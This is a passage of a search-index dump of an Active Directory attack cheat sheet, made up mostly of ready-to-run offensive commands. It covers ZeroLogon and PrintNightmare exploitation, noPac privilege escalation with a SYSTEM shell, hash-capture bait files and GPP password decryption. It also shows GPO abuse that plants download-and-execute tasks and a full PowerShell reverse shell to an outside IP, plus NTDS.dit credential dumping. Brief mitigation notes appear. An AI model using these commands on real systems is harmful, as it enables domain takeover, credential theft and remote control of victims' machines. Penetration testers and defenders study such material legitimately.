:warning: If the clock is skewed use clock-skew.nse script from nmap Linux> $ nmap -sV -sC 10.10.10.10 clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s Linux> sudo date -s \"14 APR 2015 18:25:16\" Windows> net time /domain /set","title":"MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#mitigations","text":"Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780","title":"Mitigations"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#from-cve-to-system-shell-on-dc","text":"Sometimes you will find a Domain Controller without the latest patches installed, use the newest CVE to gain a SYSTEM shell on it. If you have a \"normal user\" shell on the DC you can also try to elevate your privileges using one of the methods listed in Windows - Privilege Escalation","title":"From CVE to SYSTEM shell on DC"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#zerologon","text":"CVE-2020-1472 White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055 Exploit steps from the white paper Spoofing the client credential Disabling signing and sealing Spoofing a call Changing a computer's AD password to null From password change to domain admin :warning: reset the computer's AD password in a proper way to avoid any Deny of Service cve-2020-1472-exploit.py - Python script from dirkjanm ```powershell # Check (https://github.com/SecuraBV/CVE-2020-1472) proxychains python3 zerologon_tester.py DC01 172.16.1.5 $ git clone https://github.com/dirkjanm/CVE-2020-1472.git # Activate a virtual env to install impacket $ python3 -m venv venv $ source venv/bin/activate $ pip3 install . # Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py) proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5 # Find the old NT hash of the DC proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL' # Restore password from secretsdump # secretsdump will automatically dump the plaintext machine password (hex encoded) # when dumping the local registry secrets on the newest version python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3 deactivate ``` nccfsas - .NET binary for Cobalt Strike's execute-assembly ```powershell git clone https://github.com/nccgroup/nccfsas # Check execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local # Resetting the machine account password execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset # Testing from a non Domain-joined machine execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch # Now reset the password back ``` Mimikatz - 2.2.0 20200917 Post-Zerologon ```powershell privilege::debug # Check for the CVE lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ # Exploit the CVE and set the computer account's password to \"\" lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit # Execute dcsync to extract some hashes lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:\"\" /authntlm lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:\"\" /authntlm # Pass The Hash with the extracted Domain Admin hash sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN # Use IP address instead of FQDN to force NTLM with Windows APIs # Reset password to Waza1234/Waza1234/Waza1234/ # https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584 lsadump::postzerologon /target:10.10.10.10 /account:DC01$ ``` CrackMapExec - only check powershell crackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon","title":"ZeroLogon"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#printnightmare","text":"CVE-2021-1675 / CVE-2021-34527 The DLL will be stored in C:\\Windows\\System32\\spool\\drivers\\x64\\3\\ . The exploit will execute the DLL either from the local filesystem or a remote share. Requirements: * Spooler Service enabled (Mandatory) * Server with patches < June 2021 * DC with Pre Windows 2000 Compatibility group * Server with registry key HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\\NoWarningNoElevationOnInstall = (DWORD) 1 * Server with registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA = (DWORD) 0 Detect the vulnerability : * Impacket - rpcdump ps1 python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR' Protocol: [MS-RPRN]: Print System Remote Protocol * It Was All A Dream ps1 git clone https://github.com/byt3bl33d3r/ItWasAllADream cd ItWasAllADream && poetry install && poetry shell itwasalladream -u user -p Password123 -d domain 10.10.10.10/24 docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10 Trigger the exploit : NOTE : The payload can be hosted on Impacket SMB server since PR #1109 : python3 ./smbserver.py share /tmp/smb/ or using Invoke-BuildAnonymousSMBServer : Import-Module .\\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\\Share -Mode Enable SharpNightmare powershell # require a modified Impacket: https://github.com/cube0x0/impacket python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll' python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\\addCube.dll' ## LPE SharpPrintNightmare.exe C:\\addCube.dll ## RCE using existing context SharpPrintNightmare.exe '\\\\192.168.1.215\\smb\\addCube.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_addb31f9bff9e936\\Amd64\\UNIDRV.DLL' '\\\\192.168.1.20' ## RCE using runas /netonly SharpPrintNightmare.exe '\\\\192.168.1.215\\smb\\addCube.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL' '\\\\192.168.1.10' hackit.local domain_user Pass123 Invoke-Nightmare powershell ## LPE only (PS1 + DLL) Import-Module .\\cve-2021-1675.ps1 Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default Invoke-Nightmare -DriverName \"Dementor\" -NewUser \"d3m3nt0r\" -NewPassword \"AzkabanUnleashed123*\" Invoke-Nightmare -DLL \"C:\\absolute\\path\\to\\your\\bindshell.dll\" Mimikatz v2.2.0-20210709+ powershell ## LPE misc::printnightmare /server:DC01 /library:C:\\Users\\user1\\Documents\\mimispool.dll ## RCE misc::printnightmare /server:CASTLE /library:\\\\10.0.2.12\\smb\\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50 PrintNightmare - @outflanknl powershell PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password] Debug informations Error Message Debug 0x5 rpc_s_access_denied Permissions on the file in the SMB share 0x525 ERROR_NO_SUCH_USER The specified account does not exist. 0x180 unknown error code Share is not SMB2","title":"PrintNightmare"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#samaccountname-spoofing","text":"During S4U2Self, the KDC will try to append a '\\$' to the computer name specified in the TGT, if the computer name is not found. An attacker can create a new machine account with the sAMAccountName set to a domain controller's sAMAccountName - without the '\\$'. For instance, suppose there is a domain controller with a sAMAccountName set to 'DC\\$'. An attacker would then create a machine account with the sAMAccountName set to 'DC'. The attacker can then request a TGT for the newly created machine account. After the TGT has been issued by the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC. The attacker can then perform S4U2Self and request a TGS to itself as any user. Since the machine account with the sAMAccountName set to 'DC' has been renamed, the KDC will try to find the machine account by appending a '$', which will then match the domain controller. The KDC will then issue a valid TGS for the domain controller. Requirements MachineAccountQuota > 0 Check for exploitation Check the MachineAccountQuota of the account powershell crackmapexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ StandIn.exe --object ms-DS-MachineAccountQuota=* Check if the DC is vulnerable powershell crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac Exploitation Create a computer account ```powershell impacket@linux> addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword' powermad@windows> . .\\Powermad.ps1 powermad@windows> $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force powermad@windows> New-MachineAccount -MachineAccount \"ControlledComputer\" -Password $($password) -Domain \"domain.local\" -DomainController \"DomainController.domain.local\" -Verbose sharpmad@windows> Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword 1. Clear the controlled machine account `servicePrincipalName` attribute ps1 impacket@linux> addspn.py -u 'domain\\user' -p 'password' -t 'ControlledComputer$' -c DomainController powershell@windows> . .\\Powerview.ps1 powershell@windows> Set-DomainObject \"CN=ControlledComputer,CN=Computers,DC=domain,DC=local\" -Clear 'serviceprincipalname' -Verbose 2. (CVE-2021-42278) Change the controlled machine account `sAMAccountName` to a Domain Controller's name without the trailing `$` ps1","title":"samAccountName spoofing"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#httpsgithubcomsecureauthcorpimpacketpull1224","text":"impacket@linux> renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password' powermad@windows> Set-MachineAccountAttribute -MachineAccount \"ControlledComputer\" -Value \"DomainController\" -Attribute samaccountname -Verbose 3. Request a TGT for the controlled machine account ps1 impacket@linux> getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword' cmd@windows> Rubeus.exe asktgt /user:\"DomainController\" /password:\"ComputerPassword\" /domain:\"domain.local\" /dc:\"DomainController.domain.local\" /nowrap 4. Reset the controlled machine account sAMAccountName to its old value ps1 impacket@linux> renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password' powermad@windows> Set-MachineAccountAttribute -MachineAccount \"ControlledComputer\" -Value \"ControlledComputer\" -Attribute samaccountname -Verbose 5. (CVE-2021-42287) Request a service ticket with `S4U2self` by presenting the TGT obtained before ps1","title":"https://github.com/SecureAuthCorp/impacket/pull/1224"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#httpsgithubcomsecureauthcorpimpacketpull1202","text":"impacket@linux> KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController' cmd@windows> Rubeus.exe s4u /self /impersonateuser:\"DomainAdmin\" /altservice:\"ldap/DomainController.domain.local\" /dc:\"DomainController.domain.local\" /ptt /ticket:[Base64 TGT] `` 6. DCSync: KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'` Automated exploitation: noPac - @cube0x0 powershell noPac.exe scan -domain htb.local -user user -pass 'password123' noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt noPac.exe -domain htb.local -user domain_user -pass \"Password123!\" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator sam_the_admin - @WazeHell ps1 $ python3 sam_the_admin.py \"caltech/alice.cassie:Lee@tPass\" -dc-ip 192.168.1.110 -shell [*] Selected Target dc.caltech.white [*] Total Domain Admins 11 [*] will try to impersonat gaylene.dreddy [*] Current ms-DS-MachineAccountQuota = 10 [*] Adding Computer Account \"SAMTHEADMIN-11$\" [*] MachineAccount \"SAMTHEADMIN-11$\" password = EhFMT%mzmACL [*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzmACL. [*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white [*] SAMTHEADMIN-11$ sAMAccountName == dc [*] Saving ticket in dc.ccache [*] Resting the machine account to SAMTHEADMIN-11$ [*] Restored SAMTHEADMIN-11$ sAMAccountName to original value [*] Using TGT from cache [*] Impersonating gaylene.dreddy [*] Requesting S4U2self [*] Saving ticket in gaylene.dreddy.ccache [!] Launching semi-interactive shell - Careful what you execute C:\\Windows\\system32>whoami nt authority\\system Pachine - @ly4k powershell usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$] [-computer-pass password] [-debug] [-method {SAMR,LDAPS}] [-port {139,445,636}] [-baseDN DC=test,DC=local] [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] -dc-host hostname [-dc-ip ip] [domain/]username[:password] $ python3 pachine.py -dc-host dc.predator.local -scan 'predator.local/john:Passw0rd!' $ python3 pachine.py -dc-host dc.predator.local -spn cifs/dc.predator.local -impersonate administrator 'predator.local/john:Passw0rd!' $ export KRB5CCNAME=$PWD/administrator@predator.local.ccache $ impacket-psexec -k -no-pass 'predator.local/administrator@dc.predator.local' Mitigations : * KB5007247 - Windows Server 2012 R2 * KB5008601 - Windows Server 2016 * KB5008602 - Windows Server 2019 * KB5007205 - Windows Server 2022 * KB5008102 * KB5008380","title":"https://github.com/SecureAuthCorp/impacket/pull/1202"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#open-shares","text":"Some shares can be accessible without authentication, explore them to find some juicy files smbmap powershell smbmap -H 10.10.10.10 # null session smbmap -H 10.10.10.10 -R # recursive listing smbmap -H 10.10.10.10 -u invaliduser # guest smb session smbmap -H 10.10.10.10 -d \"DOMAIN.LOCAL\" -u \"USERNAME\" -p \"Password123*\" pth-smbclient from path-toolkit powershell pth-smbclient -U \"AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A\" //192.168.10.100/Share pth-smbclient -U \"AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A\" //192.168.10.100/C$ ls # list files cd # move inside a folder get # download files put # replace a file smbclient from Impacket powershell smbclient -I 10.10.10.100 -L ACTIVE -N -U \"\" Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk use Sharename # select a Sharename cd Folder # move inside a folder ls # list files smbclient - from Samba, ftp-like client to access SMB/CIFS resources on servers ```powershell smbclient -U username //10.0.0.1/SYSVOL smbclient //10.0.0.1/Share # Download a folder recursively smb: > mask \"\" smb: > recurse ON smb: > prompt OFF smb: > lcd '/path/to/go/' smb: > mget * ```","title":"Open Shares"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#scf-and-url-file-attack-against-writeable-share","text":"Theses attacks can be automated with Farmer.exe and Crop.exe # Farmer to receive auth farmer.exe <port> [seconds] [output] farmer.exe 8888 0 c:\\windows\\temp\\test.tmp # undefinitely farmer.exe 8888 60 # one minute # Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks crop.exe <output folder> <output filename> <WebDAV server> <LNK value> [options] Crop.exe \\\\\\\\fileserver\\\\common mdsec.url \\\\\\\\workstation@8888\\\\mdsec.ico Crop.exe \\\\\\\\fileserver\\\\common mdsec.library-ms \\\\\\\\workstation@8888\\\\mdsec","title":"SCF and URL file attack against writeable share"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#scf-files","text":"Drop the following @something.scf file inside a share and start listening with Responder : responder -wrf --lm -v -I eth0 [Shell] Command=2 IconFile=\\\\10.10.10.10\\Share\\test.ico [Taskbar] Command=ToggleDesktop Using crackmapexec : crackmapexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP","title":"SCF Files"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#url-files","text":"This attack also works with .url files and responder -I eth0 -v . [InternetShortcut] URL=whatever WorkingDirectory=whatever IconFile=\\\\10.10.10.10\\%USERNAME%.icon IconIndex=1","title":"URL Files"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#windows-library-files","text":"Windows Library Files (.library-ms) <?xml version=\"1.0\" encoding=\"UTF-8\"?> <libraryDescription xmlns=\"<http://schemas.microsoft.com/windows/2009/library>\"> <name>@windows.storage.dll,-34582</name> <version>6</version> <isLibraryPinned>true</isLibraryPinned> <iconReference>imageres.dll,-1003</iconReference> <templateInfo> <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType> </templateInfo> <searchConnectorDescriptionList> <searchConnectorDescription> <isDefaultSaveLocation>true</isDefaultSaveLocation> <isSupported>false</isSupported> <simpleLocation> <url>\\\\\\\\workstation@8888\\\\folder</url> </simpleLocation> </searchConnectorDescription> </searchConnectorDescriptionList> </libraryDescription>","title":"Windows Library Files"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#windows-search-connectors-files","text":"Windows Search Connectors (.searchConnector-ms) <?xml version=\"1.0\" encoding=\"UTF-8\"?> <searchConnectorDescription xmlns=\"<http://schemas.microsoft.com/windows/2009/searchConnector>\"> <iconReference>imageres.dll,-1002</iconReference> <description>Microsoft Outlook</description> <isSearchOnlyItem>false</isSearchOnlyItem> <includeInStartMenuScope>true</includeInStartMenuScope> <iconReference>\\\\\\\\workstation@8888\\\\folder.ico</iconReference> <templateInfo> <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType> </templateInfo> <simpleLocation> <url>\\\\\\\\workstation@8888\\\\folder</url> </simpleLocation> </searchConnectorDescription>","title":"Windows Search Connectors Files"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#passwords-in-sysvol-group-policy-preferences","text":"Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: \\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\ . findstr /S /I cpassword \\\\<FQDN>\\sysvol\\<FQDN>\\policies\\*.xml Decrypt a Group Policy Password found in SYSVOL (by 0x00C651E0 ), using the 32-byte AES key provided by Microsoft in the MSDN - 2.2.1.1.4 Password Encryption echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000 e.g: echo '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000 echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000","title":"Passwords in SYSVOL &amp; Group Policy Preferences"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#automate-the-sysvol-and-passwords-research","text":"Metasploit modules to enumerate shares and credentials c scanner/smb/smb_enumshares post/windows/gather/enum_shares post/windows/gather/credentials/gpp CrackMapExec modules powershell cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password Get-GPPPassword ```powershell # with a NULL session Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER' # with cleartext credentials Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER' # pass-the-hash Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER' ```","title":"Automate the SYSVOL and passwords research"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#mitigations_1","text":"Install KB2962486 on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences. Delete existing GPP xml files in SYSVOL containing passwords. Don\u2019t put passwords in files that are accessible by all authenticated users.","title":"Mitigations"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#exploit-group-policy-objects-gpo","text":"Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner :triangular_flag_on_post: GPO Priorization : Organization Unit > Domain > Site > Local GPO are stored in the DC in \\\\<domain.dns>\\SYSVOL\\<domain.dns>\\Policies\\<GPOName>\\ , inside two folders User and Machine . If you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are located at Machine\\Preferences\\ScheduledTasks . :warning: Domain members refresh group policy settings every 90 minutes by default but it can locally be forced with the following command: gpupdate /force .","title":"Exploit Group Policy Objects GPO"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#find-vulnerable-gpo","text":"Look a GPLink where you have the Write right. Get-DomainObjectAcl -Identity \"SuperSecureGPO\" -ResolveGUIDs | Where-Object {($_.ActiveDirectoryRights.ToString() -match \"GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner\")}","title":"Find vulnerable GPO"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#abuse-gpo-with-sharpgpoabuse","text":"# Build and configure SharpGPOAbuse $ git clone https://github.com/FSecureLABS/SharpGPOAbuse $ Install-Package CommandLineParser -Version 1.9.3.15 $ ILMerge.exe /out:C:\\SharpGPOAbuse.exe C:\\Release\\SharpGPOAbuse.exe C:\\Release\\CommandLine.dll # Adding User Rights .\\SharpGPOAbuse.exe --AddUserRights --UserRights \"SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight\" --UserAccount bob.smith --GPOName \"Vulnerable GPO\" # Adding a Local Admin .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName \"Vulnerable GPO\" # Configuring a User or Computer Logon Script .\\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\\\"\" --GPOName \"Vulnerable GPO\" # Configuring a Computer or User Immediate Task # /!\\ Intended to \"run once\" per GPO refresh, not run once per system .\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author DOMAIN\\Admin --Command \"cmd.exe\" --Arguments \"/c powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\\\"\" --GPOName \"Vulnerable GPO\" .\\SharpGPOAbuse.exe --AddComputerTask --GPOName \"VULNERABLE_GPO\" --Author 'LAB.LOCAL\\User' --TaskName \"EvilTask\" --Arguments \"/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND \" --Command \"cmd.exe\" --Force","title":"Abuse GPO with SharpGPOAbuse"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#abuse-gpo-with-powergpoabuse","text":"https://github.com/rootSySdk/PowerGPOAbuse PS> . .\\PowerGPOAbuse.ps1 # Adding a localadmin PS> Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO' # Assign a new right PS> Add-UserRights -Rights \"SeLoadDriverPrivilege\",\"SeDebugPrivilege\" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO' # Adding a New Computer/User script PS> Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO' # Create an immediate task PS> Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments \"'$(Get-Content evil.ps1)'\" -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO'","title":"Abuse GPO with PowerGPOAbuse"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#abuse-gpo-with-pygpoabuse","text":"$ git clone https://github.com/Hackndo/pyGPOAbuse # Add john user to local administrators group (Password: H4x00r123..) ./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \"12345677-ABCD-9876-ABCD-123456789012\" # Reverse shell example ./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \"12345677-ABCD-9876-ABCD-123456789012\" \\ -powershell \\ -command \"\\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\\$stream = \\$client.GetStream();[byte[]]\\$bytes = 0..65535|%{0};while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){;\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);\\$sendback = (iex \\$data 2>&1 | Out-String );\\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '> ';\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);\\$stream.Flush()};\\$client.Close()\" \\ -taskname \"Completely Legit Task\" \\ -description \"Dis is legit, pliz no delete\" \\ -user","title":"Abuse GPO with pyGPOAbuse"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#abuse-gpo-with-powerview","text":"# Enumerate GPO Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} # New-GPOImmediateTask to push an Empire stager out to machines via VulnGPO New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force","title":"Abuse GPO with PowerView"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#abuse-gpo-with-standin","text":"# Add a local administrator StandIn.exe --gpo --filter Shards --localadmin user002 # Set custom right to a user StandIn.exe --gpo --filter Shards --setuserrights user002 --grant \"SeDebugPrivilege,SeLoadDriverPrivilege\" # Execute a custom command StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author \"REDHOOK\\Administrator\" --command \"C:\\I\\do\\the\\thing.exe\" --args \"with args\"","title":"Abuse GPO with StandIn"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dumping-ad-domain-credentials","text":"You will need the following files to extract the ntds : - NTDS.dit file - SYSTEM hive ( C:\\Windows\\System32\\SYSTEM ) Usually you can find the ntds in two locations : systemroot\\NTDS\\ntds.dit and systemroot\\System32\\ntds.dit . - systemroot\\NTDS\\ntds.dit stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data). - systemroot\\System32\\ntds.dit is the distribution copy of the default directory that is used when you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this file is available, you can run the Active Directory Installation Wizard without having to use the server operating system CD. However you can change the location to a custom one, you will need to query the registry to get the current location. reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v \"DSA Database file\"","title":"Dumping AD Domain Credentials"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-ndtsutil","text":"C:\\>ntdsutil ntdsutil: activate instance ntds ntdsutil: ifm ifm: create full c:\\pentest ifm: quit ntdsutil: quit or ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q","title":"Using ndtsutil"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-vshadow","text":"vssadmin create shadow /for=C : Copy Shadow_Copy_Volume_Name\\windows\\ntds\\ntds.dit c:\\ntds.dit You can also use the Nishang script, available at : https://github.com/samratashok/nishang Import-Module .\\Copy-VSS.ps1 Copy-VSS Copy-VSS -DestinationDir C:\\ShadowCopy\\","title":"Using Vshadow"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-vssadmin","text":"vssadmin create shadow /for=C: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\ShadowCopy copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\ShadowCopy","title":"Using vssadmin"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-diskshadow-a-windows-signed-binary","text":"diskshadow.txt contains : set context persistent nowriters add volume c: alias someAlias create expose %someAlias% z: exec \"cmd.exe\" /c copy z:\\windows\\ntds\\ntds.dit c:\\exfil\\ntds.dit delete shadows volume %someAlias% reset then: NOTE - must be executed from C:\\Windows\\System32 diskshadow.exe /s c:\\diskshadow.txt dir c:\\exfil reg.exe save hklm\\system c:\\exfil\\system.bak","title":"Using DiskShadow (a Windows signed binary)"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-esentutlexe","text":"Copy/extract a locked file such as the AD Database esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\folder\\ntds.dit","title":"Using esentutl.exe"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#extract-hashes-from-ntdsdit","text":"then you need to use secretsdump to extract the hashes, use the LOCAL options to use it on a retrieved ntds.dit secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL secretsdump also works remotely ./secretsdump.py -dc-ip IP AD\\administrator@domain -use-vss -pwd-last-set -user-status ./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\\$@10.0.0.1 -pwd-last-set : Shows pwdLastSet attribute for each NTDS.DIT account. -user-status : Display whether or not the user is 